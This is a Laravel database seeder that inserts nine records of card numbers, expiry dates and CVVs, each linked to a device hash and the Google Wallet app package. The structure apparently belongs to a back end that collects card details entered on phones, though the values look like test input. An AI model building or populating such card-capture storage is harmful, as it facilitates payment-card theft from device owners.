<?php

namespace Database\Seeders;

use Illuminate\Database\Seeder;
use Illuminate\Support\Facades\DB;

class ReceiveCardSeeder extends Seeder
{
    /**
     * Run the database seeds.
     */
    public function run(): void
    {
        $data = [
            [
                'id' => 1,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4225 8882 2668 8895',
                'card_date' => '05/36',
                'cvv' => '668',
                'user_first_name' => '',
                'user_last_name' => 'ftyhhj',
                'created_at' => '2026-01-03 20:07:33',
                'updated_at' => '2026-01-03 20:07:33',
            ],
            [
                'id' => 2,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4369 9009 9888 9999',
                'card_date' => '05/26',
                'cvv' => '5666',
                'user_first_name' => '',
                'user_last_name' => 'cbbn',
                'created_at' => '2026-01-03 20:13:26',
                'updated_at' => '2026-01-03 20:13:26',
            ],
            [
                'id' => 3,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4524 8889 9654 5555',
                'card_date' => '06/36',
                'cvv' => '555',
                'user_first_name' => '',
                'user_last_name' => 'dee',
                'created_at' => '2026-01-05 20:11:56',
                'updated_at' => '2026-01-05 20:11:56',
            ],
            [
                'id' => 4,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4156 7988 6866 8689',
                'card_date' => '08/26',
                'cvv' => '6434',
                'user_first_name' => '',
                'user_last_name' => 'ehsjsjj',
                'created_at' => '2026-01-05 20:40:24',
                'updated_at' => '2026-01-05 20:40:24',
            ],
            [
                'id' => 5,
                'device_id' => 3,
                'device_number' => '319425b2234ad2789f701eb3656c5518',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '6543 2588 4558 8855',
                'card_date' => '12/28',
                'cvv' => '654',
                'user_first_name' => '',
                'user_last_name' => '呵呵',
                'created_at' => '2026-01-05 20:52:53',
                'updated_at' => '2026-01-05 20:52:53',
            ],
            [
                'id' => 6,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4166 5659 9795 6959',
                'card_date' => '06/36',
                'cvv' => '6464',
                'user_first_name' => '',
                'user_last_name' => 'whhsjsj',
                'created_at' => '2026-01-06 00:11:22',
                'updated_at' => '2026-01-06 00:11:22',
            ],
            [
                'id' => 7,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4165 6867 9798 6858',
                'card_date' => '06/39',
                'cvv' => '6564',
                'user_first_name' => '',
                'user_last_name' => 'dghdjdjdj',
                'created_at' => '2026-01-06 15:32:00',
                'updated_at' => '2026-01-06 15:32:00',
            ],
            [
                'id' => 8,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4189 9885 6698 5666',
                'card_date' => '06/39',
                'cvv' => '556',
                'user_first_name' => '',
                'user_last_name' => 'hhhh',
                'created_at' => '2026-01-06 20:00:50',
                'updated_at' => '2026-01-06 20:00:50',
            ],
            [
                'id' => 9,
                'device_id' => 1,
                'device_number' => '8f4710cae23caccb7f20d603f570167b',
                'app_name' => 'Google Wallet',
                'app_package' => 'com.google.android.apps.walletnfcrel',
                'card_number' => '4196 5684 9868 6564',
                'card_date' => '06/39',
                'cvv' => '6565',
                'user_first_name' => '',
                'user_last_name' => 'shhshsh',
                'created_at' => '2026-01-06 20:54:09',
                'updated_at' => '2026-01-06 20:54:09',
            ],
        ];

        foreach ($data as $row) {
            DB::table('receive_cards')->insert($row);
        }
    }
}
